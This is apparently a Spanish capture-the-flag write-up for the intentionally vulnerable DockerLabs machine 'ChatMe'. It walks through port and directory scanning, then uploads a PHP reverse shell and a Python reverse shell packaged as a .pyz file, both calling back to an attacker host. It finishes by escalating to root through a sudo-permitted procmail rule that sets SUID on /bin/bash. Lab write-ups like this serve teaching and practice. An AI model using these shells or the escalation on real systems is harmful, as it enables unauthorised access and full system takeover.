---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ChatMe DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip chatme.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh chatme.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 14:50 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000037s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: ChatMe - The Best Online Chat Solution
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```

Vemos que hay un puerto `80` que hay una pagina web que no nos sirve de mucho, pero si pinchamos en una parte de la pagina o vemos el codigo descubriremos que tiene un dominio llamado `chat.chatme.dl` por lo que lo añadiremos al archivo `hosts` para que se resuelva.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          chat.chatme.dl
```

Lo guardamos y ahora probaremos a introducir en la URL lo siguiente:

```
URL = http://chat.chatme.dl/
```

Vemos que nos lleva a otra pagina donde tenemos una especie de chat en el que podemos interactuar, pero sobre todo subir archivos, veremos que nos dice `gobuster`.

## Gobuster

```shell
gobuster dir -u http://chat.chatme.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k -r --exclude-length 1891
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.chatme.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1891
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE              (Status: 200) [Size: 35147]
/chat.php             (Status: 200) [Size: 2]
/css                  (Status: 403) [Size: 162]
/index2.php           (Status: 200) [Size: 5769]
/js                   (Status: 403) [Size: 162]
/upload.php           (Status: 200) [Size: 147]
/upload2.php          (Status: 200) [Size: 64]
/uploads              (Status: 403) [Size: 162]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay una carpeta interesante llamada `/uploads`, pero si vamos a la direccion de `/upload.php` veremos el siguiente mensaje:

```
{"status":"error","message":"Sorry, only JPG, JPEG, PNG & GIF files are allowed."}{"status":"error","message":"Sorry, your file was not uploaded."}
```

Nos da una pista de las extensiones que podemos cargar, por lo que probaremos a subir el siguiente archivo.

```shell
nano shell.php

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si lo intentamos subir, no nos da ningun mensaje de error, pero si probamos algunas de esas extensiones permitidas con nuestro archivo que subimos, veremos que se cambia automaticamente de extension.

```
URL = http://chat.chatme.dl/uploads/shell.png
```

## Escalate user system

Por lo que haremos lo siguiente, la interfaz de chat nos recuerda a `Whatsapp`, si bien sabemos la misma aplicacion tuvo una vulnerabilidad en la que se podian subir archivos con la extension `.pyz` la cual se hace comprimiendo un archivo `.py` y se ejecutaba de forma interna pudiendo hacer practicamente lo que se quisiera, por lo que probaremos hacerlo.

```shell
nano revshell.py

#Dentro del nano
#!/bin/python3

# reverse_shell.py
import socket
import subprocess
import os

# Cambia la IP y el puerto a los de tu máquina atacante
HOST = '<IP>'
PORT = <PORT>

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Redirige la entrada, salida y errores al socket
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Inicia una shell interactiva
    subprocess.call(['/bin/sh', '-i'])

reverse_shell()
```

Lo comprimiremos de la siguiente forma:

```shell
mkdir reverseshell
mv revshell.py reverseshell
python3 -m zipapp reverseshell -o revshell.pyz -m "revshell:revshell"
```

Y esto nos generara el archivo `revshell.pyz` el cual subiremos a la pagina dandole a `Browser` y despues a `Send`.

Solo tendremos que esperar entorno a 1 minuto para que nos de la shell y ya estariamos dentro de la maquina como el usuario `system`.

```
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [172.17.0.2] 47632
/bin/sh: 0: can't access tty; job control turned off
$ whoami
system
```

### Sanitizar la shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for system on 5f8ab1ba9349:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User system may run the following commands on 5f8ab1ba9349:
    (ALL : ALL) NOPASSWD: /usr/bin/procmail
```

Por lo que podremos hacer lo siguiente...

```shell
cd /tmp
```

```shell
nano .procmailrc

#Dentro del nano
TMPFILE="/tmp/pwned2.txt"

:0
| touch $TMPFILE;chmod u+s /bin/bash
```

```shell
nano pwned2.txt

#Dentro del nano
test
```

```shell
 echo "test" | sudo procmail -m .procmailrc
```

Y si listamos la `bash` veremos que se pusieron los permisos `SUID` correctamente, por lo que haremos lo siguiente.

```shell
bash -p
```

Para ejecutarla con privilegios y ya seremos `root`.

```
bash-5.2# whoami
root
```
